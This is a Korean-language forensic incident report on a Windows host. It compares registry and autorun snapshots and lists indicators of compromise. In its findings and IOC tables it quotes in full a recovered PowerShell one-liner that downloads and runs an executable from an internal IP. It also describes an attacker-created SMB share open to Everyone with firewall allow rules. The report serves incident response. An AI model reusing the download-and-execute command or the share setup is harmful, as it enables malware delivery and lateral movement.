# DESKTOP-IS00QJN 신규 증적 통합 분석 보고서

## 1. 분석 대상 및 무결성

| 파일 | 실제 형식 | 크기 | SHA-256 |
|---|---|---:|---|
| `Before.arn` | OLE Compound Binary 기반 Sysinternals Autoruns ARN (`Autoruns`, version 7) | 6,327,804 bytes | `6F1C37A8AADC1D282DD3C6484767B19EF2B6E2A2AA0F5CBC7BC0754CAD86C75A` |
| `After.arn` | OLE Compound Binary 기반 Sysinternals Autoruns ARN (`Autoruns`, version 7) | 6,327,804 bytes | `241C26B730555361D622F0D3DB629940E8BD93692AAAB9F5BF1BF428F880F683` |
| `레지샷.txt` | Regshot 1.9.1 x64 Unicode 비교 로그(UTF-16LE) | 3,624,272 bytes | `BD18A5EA7803B00C4B55CD9C11955D54C2EE3D4DA2E7721A8AADA8D13E417449` |

Regshot 헤더상 대상은 `DESKTOP-IS00QJN`, 사용자는 `Administrator`, 비교 구간은 `2026-09-15 00:28:39`부터 `2026-09-15 18:11:10`까지이다. Regshot 헤더에는 시간대 정보가 포함되지 않는다.

## 2. 핵심 Finding

| 우선순위 | Finding | 레지스트리 키/값 | Before | After | 시간정보 | 의미/침해 연관성 |
|---|---|---|---|---|---|---|
| 높음 | Run 대화상자를 통한 PowerShell 다운로드·검증·실행 명령 | `HKU\S-1-5-21-1291778260-3289171352-1194275199-1107\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\e` | 값 없음 | `powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'ca7376fb8a63573c3ae02147e6105bce76c091bc7d39c6f2d449bbe9b69e5fc8'){&$p}else{ri $p -Force}"\1` | 개별 값 timestamp 없음. Regshot 비교 구간 내 추가 | PowerShell을 프로필 없이 실행하고 내부 IP에서 `a.exe`를 내려받아 지정 SHA-256과 일치하면 실행한다. ClickFix형 Run 대화상자 실행과 직접 부합한다. 다운로드·해시 검증·실행의 성공 여부와 Sliver 식별은 이 값만으로 확정할 수 없다. |
| 높음 | RunMRU 목록 변경 | 같은 키의 `MRUList` | `cba` | `decba` | 개별 값 timestamp 없음 | 새 `d=cmd`, `e=PowerShell 명령`이 RunMRU에 포함되었음을 교차확인한다. `RunMRU`는 자동시작 지속성 키가 아니라 Run 대화상자 실행 이력이다. |
| 중간 | PowerShell 활동 시각 보강 | `HKU\...\Software\Microsoft\Windows\CurrentVersion\Search\JumplistData\{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe` | 값 없음 | `0x01DD453BF23BC46B` | FILETIME 표준 해석: `2026-09-15 17:59:26.0373099 UTC` (`2026-09-16 02:59:26.0373099 KST`) | 캡처 구간 내 PowerShell 관련 활동을 보강한다. RunMRU 명령의 정확한 실행시각으로 단정하지 않는다. |
| 보강 | PowerShell 이름의 RAS 추적 키 생성 | `HKLM\SOFTWARE\Microsoft\Tracing\PowerShell_RASAPI32`, `PowerShell_RASMANCS` | 키 없음 | 추적 구성 값 생성; `EnableFileTracing=0`, `FileDirectory=%windir%\tracing` 등 | 개별 timestamp 없음 | PowerShell 프로세스에서 RAS 구성요소가 초기화된 정황이다. C2 접속 자체를 입증하지는 않으며 추적 기능은 비활성화 상태다. |
| 높음 | `TempShare` SMB 공유 생성 | `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\TempShare` | 값 없음 | `CATimeout=0`, `CSCFlags=0`, `MaxUses=4294967295`, `Path=C:\TempShare`, `Permissions=63`, `ShareName=TempShare`, `Type=0` | 개별 timestamp 없음. 비교 구간 내 추가 | `C:\TempShare`가 `TempShare`로 새로 공유되었다. 파일 서버 접근·전송 또는 측면 이동 준비와 직접 관련성이 높은 변경이다. `ControlSet001` 표시는 동일한 논리 변경의 별칭으로 중복 집계하지 않았다. |
| 높음 | `TempShare`에 Everyone Full Control ACL | `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\Security\TempShare` | 값 없음 | 76-byte self-relative security descriptor | 개별 timestamp 없음 | DACL의 허용 ACE가 `S-1-1-0`(Everyone)에 access mask `0x001F01FF`를 부여한다. Full Control로 해석되며 무단 파일 접근·전송 위험이 높다. |
| 높음 | SMB·NetBIOS·RPC 방화벽 허용 규칙 추가 | `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules\{GUID}` 16개 | 값 없음 | `Action=Allow`, `Active=TRUE`; Public 프로필에 TCP 445/139, UDP 137/138, RPC/RPC-EPMap 및 LLMNR/ICMP 관련 규칙 | 개별 timestamp 없음 | 인바운드 SMB 445/139 및 RPC 허용은 `TempShare`의 원격 접근성을 확대한다. 파일 공유 기반 측면 이동 정황과 강하게 연관되지만 실제 원격 접속 성공·원격 호스트는 별도 로그가 필요하다. |
| 정보 | 이벤트 로그 자동 백업 설정 추가 | `HKLM\SYSTEM\CurrentControlSet\Services\EventLog\{Application,Security,System}\AutoBackupLogFiles` | 값 없음 | 각각 `0x00000001` | 개별 timestamp 없음 | 로그 자동 백업 활성화로 보이며 단독으로 침해 지표로 판단하지 않는다. |

## 3. Autoruns Before/After 비교

| 항목 | Before | After | 결과 |
|---|---:|---:|---|
| Autoruns 항목 수 | 1,479 | 1,479 | 동일 |
| 전체 논리 스트림 | 15,671 | 15,671 | 모든 내용 동일 |
| 항목 추가·삭제·변경 | 0 | 0 | **변경 없음** |

두 ARN의 SHA-256은 다르지만, 변경된 것은 1,481개 OLE 디렉터리 엔트리의 저장 메타데이터뿐이다. 스트림 내용, 디렉터리 구조, Autoruns 항목과 각 항목의 내장 `TimeStamp`는 모두 동일하다. 따라서 ARN 해시 차이를 레지스트리 변경이나 침해 시각으로 해석하면 안 된다.

## 4. 우선 검토 영역별 판단

| 검토 영역 | 결과 | 판단 |
|---|---|---|
| ClickFix | RunMRU에 PowerShell 원라이너 추가 | **직접 부합** |
| Sliver C2 beacon | `a.exe` 다운로드·조건부 실행 명령 확인 | Sliver 제품 식별은 불가. 파일 또는 네트워크 증적 필요 |
| 서비스 등록/변경 | 새 악성 서비스 없음 | `vm3dservice`, `VMRawDsk`는 VMware Tools/드라이버 갱신과 대소문자 변화가 중심이며 실행 경로는 전후 동일 |
| Unquoted Service Path LPE | 확인되지 않음 | 변경된 서비스 경로에 시나리오에 해당하는 공백 포함 비인용 실행 경로가 없음 |
| Run/RunOnce 지속성 | 자동시작 변경 없음 | RunMRU 실행 이력과 Run 자동시작 키를 구분해야 함 |
| Winlogon | 침해성 변경 없음 | 공격 관련 `Shell`, `Userinit` 변경 없음 |
| IFEO / AppInit | 변경 없음 | `Debugger`, `GlobalFlag`, `AppInit_DLLs` 변화 없음 |
| Defender·보안 설정 | 변경 없음 | Defender 예외·실시간 감시 비활성화, LSA `RunAsPPL`, WDigest `UseLogonCredential` 변화 없음 |
| PowerShell | 실행 명령·JumpList·RAS 추적 키 확인 | 초기 실행 단계의 강한 정황 |
| LSASS dump | 직접 증적 없음 | `lsass`, `comsvcs MiniDump`, ProcDump, Mimikatz 계열 문자열 및 관련 보호 설정 변화 없음. 행위 부재를 뜻하지는 않음 |
| 사용자·권한 | 공격 관련 변경 없음 | 신규 SAM 사용자, 숨김 사용자, `LocalAccountTokenFilterPolicy`, UAC 우회 정책 변화 없음 |
| File Server lateral movement | 공유·ACL·방화벽 변경 확인 | **원격 파일 접근 준비/노출 정황 강함**. 실제 연결 성공과 대상 호스트는 미확인 |

## 5. IOC

| 유형 | 값 |
|---|---|
| 다운로드 URL | `http://192.168.50.10:8000/a.exe` |
| 원격 IP/포트 | `192.168.50.10:8000` |
| 로컬 저장 위치 | `%TEMP%\a.exe` |
| 명령 내 기대 SHA-256 | `ca7376fb8a63573c3ae02147e6105bce76c091bc7d39c6f2d449bbe9b69e5fc8` |
| 생성 공유 | `\\DESKTOP-IS00QJN\TempShare` → `C:\TempShare` |
| 공유 ACL | Everyone Full Control (`S-1-1-0`, `0x001F01FF`) |

## 6. 핵심 결론

새 증적 세트에서는 ClickFix형 PowerShell 명령이 `RunMRU`에 직접 남아 있으며, `192.168.50.10:8000`에서 `%TEMP%\a.exe`를 내려받아 해시 검증 후 실행하도록 구성되어 있다. 이는 초기 실행 단계의 핵심 증적이다.

또한 `TempShare` 생성, Everyone Full Control ACL, Public 프로필의 SMB/NetBIOS/RPC 방화벽 허용이 함께 확인되어 파일 공유 기반 측면 이동 준비 또는 원격 노출 정황이 강하다.

반면 Autoruns 항목 변화, 악성 서비스 등록, Unquoted Service Path LPE, Defender 비활성화, LSASS dump 및 Sliver 제품 식별은 현재 세 파일에서 확인되지 않았다. 이 단계들은 서비스 이벤트 로그, PowerShell 로그, Sysmon/EDR, 파일 원본과 네트워크 트래픽으로 추가 검증해야 한다.
